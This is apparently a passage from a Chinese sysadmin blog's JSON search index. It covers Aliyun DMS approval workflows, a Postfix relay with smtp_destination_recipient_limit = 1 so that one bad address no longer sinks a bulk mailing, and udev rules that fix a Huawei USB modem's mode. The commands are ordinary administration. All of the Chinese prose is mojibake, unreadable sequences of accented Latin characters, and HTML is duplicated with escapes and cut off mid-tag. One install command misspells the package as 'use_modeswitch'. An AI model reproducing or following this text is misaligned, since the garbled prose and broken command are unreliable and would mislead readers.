src=\"/posts/20240305-aliyun_dms/image-20240305164150203.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé€‰æ‹©å®ä¾‹çš„å³è¾¹ï¼Œæ›´å¤š\u0026ndash;\u0026gt;ç¼–è¾‘å®ä¾‹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164629786\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305164629786.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå®ä¾‹çš„è´¦å·ã€å¯†ç ã€å®‰å…¨ååŒã€å®‰å…¨è§„åˆ™éƒ½é€‰ä¸Šï¼Œç„¶åé«˜çº§ä¿¡æ¯é‡Œï¼Œå®ä¾‹DBAå°±å¯ä»¥é€‰æ‹©åˆšæ‰è®¾ç½®äº†DBAè§’è‰²çš„äººäº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164843708\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305164843708.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305164811202\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305164811202.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"ä¸‰è®¾ç½®å®¡æ‰¹æµç¨‹\"\u003eä¸‰ã€è®¾ç½®å®¡æ‰¹æµç¨‹\u003c/h4\u003e\n\u003cp\u003eç„¶åå»å®‰å…¨ä¸è§„èŒƒï¼Œå®¡æ‰¹æµç¨‹ï¼Œæ–°å¢å®¡æ‰¹æ¨¡æ¿ï¼Œæ¥è‡ªå®šä¹‰å®¡æ‰¹æµ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165022278\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305165022278.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å…¬å¸çš„å®¡æ‰¹æµä¸æ˜¯380ç¼ºçœé‚£ä¸ªï¼Œ380æ˜¯éœ€è¦ä¸‰ä¸ªäººå®¡æ‰¹çš„ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165111340\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305165111340.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬çš„é“¾è·¯å°±å¾ˆå»ºå•äº†ï¼Œæœ‰æ“ä½œæƒé™çš„äººæ‰¾å®ä¾‹çš„DBAå®¡æ‰¹ï¼Œç„¶åè¿‡æœ€é«˜ç®¡ç†å‘˜æ‰¹å°±å®Œäº†ï¼Œæ‰€ä»¥åšå¦‚ä¸‹çš„æµç¨‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165212283\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305165212283.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"å››è®¾ç½®å®‰å…¨è§„åˆ™\"\u003eå››ã€è®¾ç½®å®‰å…¨è§„åˆ™\u003c/h4\u003e\n\u003cp\u003eæˆ‘ä»¬å†åˆ°å®‰å…¨ä¸è§„èŒƒï¼Œç‚¹å‡»å®‰å…¨è§„åˆ™ï¼Œæ‰¾åˆ°å…·ä½“å®ä¾‹é‡Œè®¾ç½®çš„ å¼ºç®¡æ§æ¨¡å¼ for MySQL\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165325268\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305165325268.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¯ä»¥çœ‹åˆ°å·²ç»æœ‰2ä¸ªå®ä¾‹ç”¨ä¸Šäº†ï¼Œç„¶ååˆ°å³è¾¹ï¼Œç‚¹å‡»ç¼–è¾‘ï¼š\u003c/p\u003e\n\u003cp\u003eæœ€ä¸»è¦çš„å°±æ˜¯SQLå˜æ›´ï¼Œæ•°æ®å˜æ›´é»˜è®¤å®¡æ‰¹æ¨¡æ¿çš„è®¾ç½®ï¼Œæˆ‘ä»¬æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„å®¡æ‰¹æµå³å¯\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165536661\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305165536661.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…¶ä»–çš„é€‰é¡¹éƒ½å¯ä»¥æŒ‰éœ€è¿›è¡Œä¿®æ”¹ã€‚\u003c/p\u003e\n\u003ch4 id=\"äº”è®¾ç½®ç”¨æˆ·æƒé™\"\u003eäº”ã€è®¾ç½®ç”¨æˆ·æƒé™\u003c/h4\u003e\n\u003cp\u003eå¦‚ä¸Šå®¡æ‰¹æµå°±å®Œæˆäº†ï¼Œæˆ‘ä»¬è¦ç™»å½•å…·ä½“çš„å®ä¾‹åˆ—è¡¨ï¼Œå†æ›´å¤šé‡Œè®¾ç½®æƒé™\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305170005552\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305170005552.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ä¸Šé¢æ˜¯è®¾ç½®çš„å®ä¾‹çº§åˆ«çš„æƒé™ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚æœè¦è®¾ç½®æ›´ç»†çº§åˆ«çš„åº“ã€è¡¨ã€è¡Œæƒé™ï¼Œéœ€è¦ç‚¹å‡»æ•°æ®åº“åˆ—è¡¨\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305170156449\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305170156449.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåœ¨è¿™é‡Œé¢çš„è¡¨è¯¦æƒ…çš„å³è¾¹æ›´å¤šï¼Œå¯ä»¥æ§åˆ¶åº“ã€è¡¨ã€è¡Œçš„æƒé™\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305170334390\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305170334390.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å°±å¯ä»¥å¼„å®Œæ•´ä¸ªæµç¨‹äº†ã€‚\u003c/p\u003e","title":"é˜¿é‡Œäº‘DMSç®¡ç†æ•°æ®åº“å˜æ›´å®¡æ‰¹æµ"},{"content":"è¿™ä¸ªé—®é¢˜ååˆ†çš„è®¨åŒå•Šï¼ŒBiå¤§æ•°æ®éƒ¨ä¼šç¾¤å‘æŠ¥è¡¨é‚®ä»¶ï¼Œä½†æ˜¯å¦‚æœæœ‰æŸä½å‘˜å·¥ç¦»èŒäº†ï¼Œé‚®ä»¶åœ°å€è¢«æ¸…ç†æ‰ä¸å­˜åœ¨äº†ï¼Œé‚£ä¹ˆç¾¤å‘é‚®ä»¶çš„æ—¶å€™ä¼šå¯¼è‡´ç¾¤å‘å¤±è´¥ã€‚\nç½‘ä¸Šæœç´¢äº†ä¸€åœˆï¼Œé˜¿é‡Œæœ‰ç¯‡æ–‡ç« æ˜¯åŒæ ·é—®é¢˜ï¼š\nhttps://blog.csdn.net/javaee_sunny/article/details/114836546\nè§£å†³æ–¹æ³•æ˜¯ä¿®æ”¹å‘é€ç¨‹åºï¼Œå‰”é™¤æ‰å¤±æ•ˆçš„é‚®ä»¶åœ°å€å†å‘ã€‚\nè¿™ä¸ªæ–¹æ³•åœ¨æˆ‘ä»¬è¿™é‡Œæ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºå‘é€ç¨‹åºæ²¡äººç»´æŠ¤äº†ï¼Œæ— æ³•ä¿®æ”¹ã€‚\né‚£å°±åªèƒ½æ›²çº¿æ•‘å›½äº†ï¼šå»ºç«‹ä¸€ä¸ªè½¬å‘æœåŠ¡å™¨ï¼ŒæŠŠç¾¤å‘é‚®ä»¶å˜æˆä¸€å°ä¸€ä»½å•ç‹¬å‘ï¼Œé‚£ä¹ˆå¶å°”ä¸€ä»½å¤±è´¥å°±å¤±è´¥äº†ï¼Œä¸ä¼šå¯¼è‡´æ•´ä¸ªç¾¤å‘çš„å¤±è´¥ã€‚\næ­å»ºä¸€ä¸ªPostfix relayè½¬å‘æœåŠ¡å™¨ï¼š\nvi /etc/postfix/main.cf relayhost = [smtp.qiye.aliyun.com]:587 smtp_sasl_auth_enable = yes smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd smtp_sasl_security_options = noanonymous smtp_use_tls = yes smtp_tls_CAfile = /etc/pki/tls/certs/ca-bundle.crt smtp_sender_dependent_authentication = yes smtp_destination_recipient_limit = 1 message_size_limit=102400000 è§£é‡Šï¼šè½¬å‘åˆ°é˜¿é‡Œé‚®ä»¶æœåŠ¡å™¨çš„æ ‡å‡†é…ç½®ï¼Œç½‘ç»œä¸Šå·²ç»æœ‰å¾ˆå¤šæ•™ç¨‹äº†ã€‚ç„¶åå…³é”®å°±ä¸€æ¡smtp_destination_recipient_limit = 1,è¿™ä¸ªå°±ä¼šæŠŠç¾¤å‘çš„é‚®ä»¶æ‹†æˆå•ç‹¬çš„ä¸€å°ä¸€å°å‘é€ï¼Œå‘ä¸å‡ºå»çš„ä¼šå›åˆ°queueå°è¯•ä¸æ–­å‘é€ï¼Œæœ€åå¤±è´¥dropæ‰ã€‚\nå¦å¤–postfixç¼ºçœå‘é€é‚®ä»¶çš„å¤§å°æ˜¯10Mï¼Œé˜¿é‡Œé‚®å±€ç¼ºçœæ˜¯50Mï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œmessage_size_limit=102400000æ”¹æˆ100Mçš„é™åˆ¶ã€‚\næœ€åç”Ÿæˆä¸€ä¸‹é‚®ä»¶ç”¨æˆ·çš„hashåº“ï¼š\nvi /etc/postfix/sasl_passwd [smtp.qiye.aliyun.com]:587 report@ddky.com:xxxxxxxx postmap /etc/postfix/sasl_passwd é‚£ä¹ˆå‘é‚®ä»¶çš„æ—¶å€™æŒ‡å®šè¿™å°æœåŠ¡å™¨ï¼Œç”¨æˆ·åæ˜¯ report@ddky.com , å¯†ç æ˜¯xxxxxxxxå°±å¯ä»¥äº†\nè¡¥å……ï¼Œéœ€è¦å®‰è£…ç¼ºå°‘çš„åº“ï¼Œå¦åˆ™ç™»å½•é˜¿é‡Œé‚®å±€è¿‡ä¸å»ï¼Œè¿˜éœ€è¦æ‰“å¼€æœåŠ¡å™¨çš„å…è®¸ç½‘æ®µåˆ—è¡¨ï¼Œmynetwork\nyum install -y cyrus-sasl-plain ","permalink":"https://rendoumi.com/posts/20240304-posfix_relay/","summary":"\u003cp\u003eè¿™ä¸ªé—®é¢˜ååˆ†çš„è®¨åŒå•Šï¼ŒBiå¤§æ•°æ®éƒ¨ä¼šç¾¤å‘æŠ¥è¡¨é‚®ä»¶ï¼Œä½†æ˜¯å¦‚æœæœ‰æŸä½å‘˜å·¥ç¦»èŒäº†ï¼Œé‚®ä»¶åœ°å€è¢«æ¸…ç†æ‰ä¸å­˜åœ¨äº†ï¼Œé‚£ä¹ˆç¾¤å‘é‚®ä»¶çš„æ—¶å€™ä¼šå¯¼è‡´ç¾¤å‘å¤±è´¥ã€‚\u003c/p\u003e\n\u003cp\u003eç½‘ä¸Šæœç´¢äº†ä¸€åœˆï¼Œé˜¿é‡Œæœ‰ç¯‡æ–‡ç« æ˜¯åŒæ ·é—®é¢˜ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/javaee_sunny/article/details/114836546\"\u003ehttps://blog.csdn.net/javaee_sunny/article/details/114836546\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eè§£å†³æ–¹æ³•æ˜¯ä¿®æ”¹å‘é€ç¨‹åºï¼Œå‰”é™¤æ‰å¤±æ•ˆçš„é‚®ä»¶åœ°å€å†å‘ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªæ–¹æ³•åœ¨æˆ‘ä»¬è¿™é‡Œæ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºå‘é€ç¨‹åºæ²¡äººç»´æŠ¤äº†ï¼Œæ— æ³•ä¿®æ”¹ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£å°±åªèƒ½æ›²çº¿æ•‘å›½äº†ï¼šå»ºç«‹ä¸€ä¸ªè½¬å‘æœåŠ¡å™¨ï¼ŒæŠŠç¾¤å‘é‚®ä»¶å˜æˆä¸€å°ä¸€ä»½å•ç‹¬å‘ï¼Œé‚£ä¹ˆå¶å°”ä¸€ä»½å¤±è´¥å°±å¤±è´¥äº†ï¼Œä¸ä¼šå¯¼è‡´æ•´ä¸ªç¾¤å‘çš„å¤±è´¥ã€‚\u003c/p\u003e\n\u003cp\u003eæ­å»ºä¸€ä¸ªPostfix relayè½¬å‘æœåŠ¡å™¨ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/postfix/main.cf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erelayhost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003esmtp.qiye.aliyun.com\u003cspan class=\"o\"\u003e]\u003c/span\u003e:587\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_sasl_auth_enable\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_sasl_password_maps\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e hash:/etc/postfix/sasl_passwd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_sasl_security_options\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e noanonymous\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_use_tls\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_tls_CAfile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /etc/pki/tls/certs/ca-bundle.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_sender_dependent_authentication\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_destination_recipient_limit\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emessage_size_limit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e102400000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šï¼šè½¬å‘åˆ°é˜¿é‡Œé‚®ä»¶æœåŠ¡å™¨çš„æ ‡å‡†é…ç½®ï¼Œç½‘ç»œä¸Šå·²ç»æœ‰å¾ˆå¤šæ•™ç¨‹äº†ã€‚ç„¶åå…³é”®å°±ä¸€æ¡\u003ccode\u003esmtp_destination_recipient_limit = 1\u003c/code\u003e,è¿™ä¸ªå°±ä¼šæŠŠç¾¤å‘çš„é‚®ä»¶æ‹†æˆå•ç‹¬çš„ä¸€å°ä¸€å°å‘é€ï¼Œå‘ä¸å‡ºå»çš„ä¼šå›åˆ°queueå°è¯•ä¸æ–­å‘é€ï¼Œæœ€åå¤±è´¥dropæ‰ã€‚\u003c/p\u003e\n\u003cp\u003eå¦å¤–postfixç¼ºçœå‘é€é‚®ä»¶çš„å¤§å°æ˜¯10Mï¼Œé˜¿é‡Œé‚®å±€ç¼ºçœæ˜¯50Mï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œ\u003ccode\u003emessage_size_limit=102400000\u003c/code\u003eæ”¹æˆ100Mçš„é™åˆ¶ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€åç”Ÿæˆä¸€ä¸‹é‚®ä»¶ç”¨æˆ·çš„hashåº“ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/postfix/sasl_passwd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esmtp.qiye.aliyun.com\u003cspan class=\"o\"\u003e]\u003c/span\u003e:587  report@ddky.com:xxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epostmap /etc/postfix/sasl_passwd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£ä¹ˆå‘é‚®ä»¶çš„æ—¶å€™æŒ‡å®šè¿™å°æœåŠ¡å™¨ï¼Œç”¨æˆ·åæ˜¯ \u003ca href=\"mailto:report@ddky.com\"\u003ereport@ddky.com\u003c/a\u003e , å¯†ç æ˜¯xxxxxxxxå°±å¯ä»¥äº†\u003c/p\u003e\n\u003cp\u003eè¡¥å……ï¼Œéœ€è¦å®‰è£…ç¼ºå°‘çš„åº“ï¼Œå¦åˆ™ç™»å½•é˜¿é‡Œé‚®å±€è¿‡ä¸å»ï¼Œè¿˜éœ€è¦æ‰“å¼€æœåŠ¡å™¨çš„å…è®¸ç½‘æ®µåˆ—è¡¨ï¼Œmynetwork\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y cyrus-sasl-plain\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"é‚®ç®±åœ°å€æ— æ•ˆå¯¼è‡´ç¾¤å‘é‚®ä»¶å¤±è´¥"},{"content":"è¿™ä¸æ˜¯è¦å‡ºå›½å°±æå‰æ­å»ºäº†ä¸€ä¸ªvoipçš„ç”µè¯ç³»ç»Ÿä¹ˆï¼Œç»“æœåœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œåä¸ºçš„çŒ«æ£’å±…ç„¶å‡ºç°åœ°å€æ¥å›è·³åŠ¨çš„é—®é¢˜ã€‚\næ­£å¸¸æƒ…å†µä¸‹ï¼Œlsusbçš„ç»“æœ\nlsusb Bus 001 Device 017: ID 12d1:1436 Huawei Technologies Co., Ltd. Broadband stick è¿‡ä¸€é˜µå­ï¼Œæˆ–è€…æŒç»­å‡ å¤©åï¼Œåœ°å€å°±å˜äº†\nlsusb Bus 001 Device 017: ID 12d1:1446 Huawei Technologies Co., Ltd. HSPA modem çœ‹ä¸Šé¢ï¼Œvender idä»1436å˜æˆäº†1446ï¼Œåå­—ä¹Ÿä»stickå˜æˆäº†modem\nç”±äºè¿™ä¸ªusbè®¾å¤‡æ˜¯ç›´é€šåˆ°kvmçš„freepbxè™šæœºé‡Œé¢å»çš„ï¼Œè¿™ç›´æ¥å¯¼è‡´voipç³»ç»Ÿä¸èƒ½ç”¨äº†ï¼Œå¯æ¶å•Šã€‚\nå¿…é¡»æŠŠå®ƒç»™å›ºå®šä¸‹æ¥ï¼Œé¦–å…ˆå…ˆä»1446å˜å›1436\nyum -y install epel-release yum -y install use_modeswitch usb_modeswitch -v 12d1 -p 1446 -c \u0026#34;/usr/share/usb_modeswitch/12d1:1446\u0026#34; å˜å›æ¥äº†ä¸æˆï¼Œè¿˜å¾—æŠŠå®ƒå½»åº•å›ºå®šä¸‹æ¥\nvi /lib/udev/rules.d/40-usb_modeswitch.rules #è£…äº†usb_modeswitchåå±…ç„¶å·²ç»è‡ªå¸¦äº† # Generic entry for most Huawei devices, excluding Android phones ATTRS{idVendor}==\u0026#34;12d1\u0026#34;, ATTRS{manufacturer}!=\u0026#34;Android\u0026#34;, ATTR{bInterfaceNumber}==\u0026#34;00\u0026#34;, ATTR{bInterfaceClass}==\u0026#34;08\u0026#34;, RUN+=\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34; shitï¼Œä¸ç®¡å®ƒï¼Œå†æ¬¡å¼ºè¡Œå›ºå®š\nvi /lib/udev/rules.d/40-usb_modeswitch.rulesã€ # Huawei, newer modems ATTR{idVendor}==\u0026#34;12d1\u0026#34;, ATTR{idProduct}==\u0026#34;1446\u0026#34;, RUN+=\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34; è¿™æ ·å°±æå®šäº†ï¼Œå¾—äºæå‰å‘ç°äº†è¿™é—®é¢˜ï¼Œå¦åˆ™è·‘åˆ°å›½å¤–å†å‘ç°ï¼Œå°±æ™šäº†ï¼\n","permalink":"https://rendoumi.com/posts/20240216-lsusb_huawei/","summary":"\u003cp\u003eè¿™ä¸æ˜¯è¦å‡ºå›½å°±æå‰æ­å»ºäº†ä¸€ä¸ªvoipçš„ç”µè¯ç³»ç»Ÿä¹ˆï¼Œç»“æœåœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œåä¸ºçš„çŒ«æ£’å±…ç„¶å‡ºç°åœ°å€æ¥å›è·³åŠ¨çš„é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eæ­£å¸¸æƒ…å†µä¸‹ï¼Œlsusbçš„ç»“æœ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elsusb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 017: ID 12d1:1436 Huawei Technologies Co., Ltd. Broadband stick\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿‡ä¸€é˜µå­ï¼Œæˆ–è€…æŒç»­å‡ å¤©åï¼Œåœ°å€å°±å˜äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elsusb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 017: ID 12d1:1446 Huawei Technologies Co., Ltd. HSPA modem\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹ä¸Šé¢ï¼Œvender idä»1436å˜æˆäº†1446ï¼Œåå­—ä¹Ÿä»stickå˜æˆäº†modem\u003c/p\u003e\n\u003cp\u003eç”±äºè¿™ä¸ªusbè®¾å¤‡æ˜¯ç›´é€šåˆ°kvmçš„freepbxè™šæœºé‡Œé¢å»çš„ï¼Œè¿™ç›´æ¥å¯¼è‡´voipç³»ç»Ÿä¸èƒ½ç”¨äº†ï¼Œå¯æ¶å•Šã€‚\u003c/p\u003e\n\u003cp\u003eå¿…é¡»æŠŠå®ƒç»™å›ºå®šä¸‹æ¥ï¼Œé¦–å…ˆå…ˆä»1446å˜å›1436\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install use_modeswitch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eusb_modeswitch -v 12d1 -p \u003cspan class=\"m\"\u003e1446\u003c/span\u003e -c \u003cspan class=\"s2\"\u003e\u0026#34;/usr/share/usb_modeswitch/12d1:1446\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå˜å›æ¥äº†ä¸æˆï¼Œè¿˜å¾—æŠŠå®ƒå½»åº•å›ºå®šä¸‹æ¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /lib/udev/rules.d/40-usb_modeswitch.rules\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è£…äº†usb_modeswitchåå±…ç„¶å·²ç»è‡ªå¸¦äº†\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Generic entry for most Huawei devices, excluding Android phones\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eATTRS\u003cspan class=\"o\"\u003e{\u003c/span\u003eidVendor\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;12d1\u0026#34;\u003c/span\u003e, ATTRS\u003cspan class=\"o\"\u003e{\u003c/span\u003emanufacturer\u003cspan class=\"o\"\u003e}\u003c/span\u003e!\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Android\u0026#34;\u003c/span\u003e, ATTR\u003cspan class=\"o\"\u003e{\u003c/span\u003ebInterfaceNumber\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;00\u0026#34;\u003c/span\u003e, ATTR\u003cspan class=\"o\"\u003e{\u003c/span\u003ebInterfaceClass\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;08\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eRUN\u003c/span\u003e\u003cspan class=\"o\"\u003e+=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eshitï¼Œä¸ç®¡å®ƒï¼Œå†æ¬¡å¼ºè¡Œå›ºå®š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /lib/udev/rules.d/40-usb_modeswitch.rulesã€\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Huawei, newer modems\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eATTR\u003cspan class=\"o\"\u003e{\u003c/span\u003eidVendor\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;12d1\u0026#34;\u003c/span\u003e, ATTR\u003cspan class=\"o\"\u003e{\u003c/span\u003eidProduct\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan 